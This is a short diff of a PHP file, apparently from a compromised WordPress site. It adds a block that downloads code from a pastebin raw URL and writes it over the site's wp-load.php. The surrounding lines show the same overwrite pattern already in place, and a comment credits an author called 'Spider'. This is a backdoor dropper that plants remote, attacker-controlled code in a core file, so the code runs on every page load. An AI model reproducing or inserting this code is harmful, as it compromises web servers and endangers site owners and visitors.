@@ -13,6 +13,11 @@
   $tulis2 = fwrite ($nama2 ,$file2);
  fclose($nama2); ?>
  
+ <?php $nama3= fopen("../wp-load.php" ,"w+");
+  $file3 = file_get_contents('https://pastebin.com/raw/8cB9HM4h');
+  $tulis3 = fwrite ($nama3 ,$file3);
+ fclose($nama3); ?>
+ 
  <?php 
 /**********************
 ä½œè€… Spider
